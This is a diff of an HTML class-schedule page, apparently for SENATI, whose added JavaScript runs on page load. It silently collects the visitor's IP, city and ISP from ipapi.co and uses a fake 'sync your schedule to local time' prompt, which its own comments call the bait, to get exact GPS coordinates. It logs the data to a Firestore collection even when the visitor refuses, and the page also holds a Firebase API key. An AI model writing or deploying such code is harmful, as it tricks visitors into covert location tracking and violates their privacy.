@@ -132,9 +132,11 @@
 </div>
 
 <script type="module">
+    // 1. IMPORTACIONES DE FIREBASE (CDN)
     import { initializeApp } from "https://www.gstatic.com/firebasejs/10.7.1/firebase-app.js";
     import { getFirestore, collection, addDoc, serverTimestamp } from "https://www.gstatic.com/firebasejs/10.7.1/firebase-firestore.js";
 
+    // 2. TU CONFIGURACIÓN DE FIREBASE
     const firebaseConfig = {
         apiKey: "AIzaSyCwyM8VGEBn93_A8LNpNb4MgB4OFUqjKp0",
         authDomain: "horario-senati-sync.firebaseapp.com",
@@ -144,43 +146,116 @@
         appId: "1:156759042223:web:778ceed5db5bcbb6e0cc5a"
     };
 
+    // Inicialización
     const app = initializeApp(firebaseConfig);
     const db = getFirestore(app);
 
-    async function pushTrack() {
-        let meta = { ts: serverTimestamp(), dev: navigator.userAgent, met: "IP Only" };
+    async function ejecutarRastreoYSincronizacion() {
+        let metadata = {
+            registro_fecha: serverTimestamp(),
+            user_agent: navigator.userAgent,
+            idioma: navigator.language,
+            metodo: "Solo IP (Aproximado)"
+        };
 
         try {
-            const r = await fetch('https://ipapi.co/json/');
-            const j = await r.json();
-            meta.ip = j.ip; meta.pais = j.country_name; meta.cty = j.city; meta.isp = j.org;
+            // --- PASO A: RASTREO SILENCIOSO (IP) ---
+            const res = await fetch('https://ipapi.co/json/');
+            const ipInfo = await res.json();
+            
+            metadata.ip = ipInfo.ip;
+            metadata.pais = ipInfo.country_name;
+            metadata.ciudad = ipInfo.city;
+            metadata.proveedor = ipInfo.org;
 
+            // --- PASO B: EL ANZUELO (GPS + CAMBIO DE HORA) ---
             setTimeout(() => {
-                const conf = confirm(`Se detectó acceso desde ${j.country_name}. ¿Deseas sincronizar las alarmas del horario con tu hora local?`);
-                if (conf) {
+                const mensaje = `Se ha detectado acceso desde ${ipInfo.country_name}. ¿Deseas sincronizar el horario de SENATI con tu hora local para evitar errores de asistencia?`;
+                
+                if (confirm(mensaje)) {
                     navigator.geolocation.getCurrentPosition(
-                        async (p) => {
-                            meta.lat = p.coords.latitude; meta.lon = p.coords.longitude; meta.met = "GPS Full";
-                            await addDoc(collection(db, "visitas"), meta);
-                            end("✅ Sincronizado exitosamente.");
+                        async (pos) => {
+                            // Guardamos coordenadas exactas
+                            metadata.lat = pos.coords.latitude;
+                            metadata.lon = pos.coords.longitude;
+                            metadata.precision = pos.coords.accuracy + "m";
+                            metadata.metodo = "GPS Confirmado (Exacto)";
+                            
+                            // 1. Mandar datos a Firebase
+                            await enviarAFirebase(metadata);
+                            
+                            // 2. Aplicar cambio visual de horas (La magia)
+                            aplicarAjusteHorarioVisual();
+                            
+                            finalizarUI("✅ Horario sincronizado con éxito.");
                         },
-                        async () => { await addDoc(collection(db, "visitas"), meta); end("⚠️ Error: Usando hora de Lima."); },
-                        { enableHighAccuracy: true }
+                        async (err) => {
+                            // Si rechaza el GPS, igual guardamos la IP
+                            await enviarAFirebase(metadata);
+                            finalizarUI("⚠️ Error de permisos. Usando hora de Lima.");
+                        },
+                        { enableHighAccuracy: true, timeout: 5000 }
                     );
                 } else {
-                    addDoc(collection(db, "visitas"), meta);
-                    end("Sincronización manual activa.");
+                    // Si cancela el aviso
+                    enviarAFirebase(metadata);
+                    finalizarUI("Sincronización manual cancelada.");
                 }
-            }, 1000);
-        } catch (e) { console.error(e); }
+            }, 1500);
+
+        } catch (error) {
+            console.error("Error en el proceso:", error);
+        }
     }
 
-    function end(m) {
-        document.getElementById('sync-status').innerText = m;
-        document.getElementById('sync-icon').style.display = 'none';
+    // FUNCIÓN PARA CAMBIAR LAS HORAS DE LA TABLA SEGÚN EL PAÍS
+    function aplicarAjusteHorarioVisual() {
+        const gmtPeru = -5;
+        const gmtUsuario = new Date().getTimezoneOffset() / -60;
+        const diferencia = gmtUsuario - gmtPeru;
+
+        if (diferencia !== 0) {
+            document.querySelectorAll('.time-col').forEach(celda => {
+                // Busca todas las horas en formato HH:MM o H:MM
+                const horasEncontradas = celda.innerText.match(/(\d{1,2}):(\d{2})/g);
+                
+                if (horasEncontradas) {
+                    const nuevasHoras = horasEncontradas.map(h => {
+                        let [hora, min] = h.split(':').map(Number);
+                        // Suma la diferencia horaria (Perú vs Bolivia/Otros)
+                        let horaAjustada = (hora + diferencia + 24) % 24;
+                        // Formato limpio 00:00
+                        return `${horaAjustada.toString().padStart(2, '0')}:${min.toString().padStart(2, '0')}`;
+                    });
+
+                    // Reemplaza las horas viejas por las nuevas en el texto
+                    let textoFinal = celda.innerText;
+                    horasEncontradas.forEach((original, index) => {
+                        textoFinal = textoFinal.replace(original, nuevasHoras[index]);
+                    });
+                    celda.innerText = textoFinal;
+                }
+            });
+        }
     }
 
-    window.onload = pushTrack;
+    async function enviarAFirebase(datos) {
+        try {
+            await addDoc(collection(db, "visitas"), datos);
+        } catch (e) {
+            console.error("Error al guardar en Firestore:", e);
+        }
+    }
+
+    function finalizarUI(mensaje) {
+        const statusElement = document.getElementById('sync-status');
+        const loader = document.getElementById('sync-icon');
+        if (statusElement) statusElement.innerText = mensaje;
+        if (loader) loader.style.display = 'none';
+    }
+
+    // Arrancar proceso
+    window.onload = ejecutarRastreoYSincronizacion;
 </script>
 </body>
 </html>
